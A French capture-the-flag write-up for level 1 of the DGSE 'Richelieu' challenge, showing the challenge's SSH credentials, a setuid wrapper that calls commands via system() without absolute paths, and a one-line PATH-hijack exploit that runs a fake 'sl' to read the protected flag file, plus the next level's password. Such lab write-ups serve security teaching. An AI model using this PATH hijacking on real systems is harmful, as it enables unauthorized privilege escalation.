# Challenge Richelieu de la DGSE - défi 1

https://www.challengecybersec.fr

## Pour se connecter à la machine du défi

```
ssh defi1.challengecybersec.fr -l defi1 -p 2222

mot de passe : DGSE{2f77c517b06f1cd1ce864f79f41f25ca8874413c8c1204f7ec9c6728c87f270a}
```

## Le challenge

```
defi1@AttrapeLeDrapeau:~$ ls -al
total 44
drwxr-xr-x 1 defi1         defi1         4096 May 10 10:50 .
drwxr-xr-x 1 root          root          4096 May 10 10:50 ..
-rw-r--r-- 1 defi1         defi1          220 May 15  2017 .bash_logout
-rw-r--r-- 1 defi1         defi1         3526 May 15  2017 .bashrc
-rw-r--r-- 1 defi1         defi1           32 May 10 10:50 .gdbinit
-rw-r--r-- 1 defi1         defi1          675 May 15  2017 .profile
-rw-r--r-- 1 defi1         defi1            7 May 10 10:50 .vimrc
-r-------- 1 defi1-drapeau defi1-drapeau  133 Apr 26 14:06 drapeau.txt
-r-sr-sr-x 1 defi1-drapeau defi1-drapeau 8752 May 10 10:50 prog.bin
```

Il y a un exécutable `prog.bin` _setuid_ et un fichier en lecture uniquement pour l'utilisateur `defi1-drapeau`.
Le but est donc d'utiliser ce programme pour accéder au fichier `drapeau.txt`.

C'est donc un _Capture The Flag_ (CTF) classique.

```
defi1@AttrapeLeDrapeau:~$ ./prog.bin
#################################################
##    Bienvenue dans ce lanceur (_wrapper_)    ##
#################################################
Ce logiciel vous permet de lancer ces programmes utiles simplement...
Menu :
   -> 1 : Affichage de la date et de l'heure actuelle
   -> 2 : Affichage du nombre de secondes écoulées depuis le 01/01/1970 (Epoch)
   -> 3 : Affichage du train
   -> 4 : Affichage du calendrier du mois en cours
```

## La vulnérabilité

`prog.bin` lance des binaires avec `system()`:
* choix 1: `date '+Nous sommes le %d/%m/%Y et il est %H:%M:%S'`
* choix 2: `date '+Nombre de secondes depuis Epoch : %s'`
* choix 3: `sl`
* choix 4: `cal`

Cela peut être observé avec [Ghidra](https://ghidra-sre.org), gdb, ou l'intuition.
Le chemin des binaires n'est pas absolu: la variable d'environnement `PATH` est donc utilisée.

### Note

Pour récupérer `./prog.bin` ou autre depuis la connexion ssh du challenge:

```bash
ssh defi1.challengecybersec.fr -l defi1 -p 2222 > prog.hex
DGSE{2f77c517b06f1cd1ce864f79f41f25ca8874413c8c1204f7ec9c6728c87f270a}
hexdump -ve '16/1 "%02x " "\n"' prog.bin
exit
grep -E "^([0-9a-z]{2} )+" prog.hex | xxd -r -p > prog.bin
chmod a+x prog.bin
```

## L'attaque

Il suffit d'altérer le `PATH` and ajoutant un programme `sl` (par exemple) avant `/usr/bin`. Ce programme sera exécuté avec les privilèges de l'utilisateur `defi1-drapeau` et permettra de consulter le fichier `drapeau.txt`.
```bash
echo "cat drapeau.txt" > $HOME/sl; chmod a+x $HOME/sl; PATH=$HOME:$PATH ; echo 3 | ./prog.bin
```

## Le drapeau

```
Suite du challenge Richelieu :

ssh defi2.challengecybersec.fr -l defi2 -p 2222

mot de passe : DGSE{H#M?W)el{0YZ-)77/C#ogrp}k4&EbP}
```

[Suite...](../defi2/README.md)

---
*rene-d 26 mai 2019*
